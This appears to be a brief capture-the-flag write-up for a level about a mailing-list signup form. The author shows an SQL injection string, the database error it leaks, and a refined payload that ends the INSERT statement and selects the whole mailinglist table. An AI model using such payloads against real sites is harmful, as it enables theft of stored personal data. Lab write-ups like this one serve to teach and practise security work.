#### Level 08 - All your emails are belong to us

Tried first `asdf@asdf.com';select * from mails`

That gave me this error:

```
Unexpected token: ; in statement [INSERT INTO mailinglist (email) VALUES ('asdf@asdf.com';]
```

Got some useful information, lets try this then:

```
asdf@asdf.com');select * from mailinglist--
```

Success.